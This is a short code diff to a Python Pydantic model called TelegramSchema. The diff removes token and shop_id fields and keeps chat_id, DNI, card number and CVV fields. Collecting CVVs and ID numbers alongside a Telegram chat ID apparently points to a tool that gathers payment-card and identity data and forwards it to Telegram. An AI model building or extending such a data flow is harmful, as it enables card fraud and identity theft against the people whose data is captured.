@@ -1,9 +1,7 @@
 from pydantic import BaseModel
 
 class TelegramSchema(BaseModel):
-    token:str
     chat_id:str
-    shop_id:str
     DNI:str
     number:str
     CVV:str
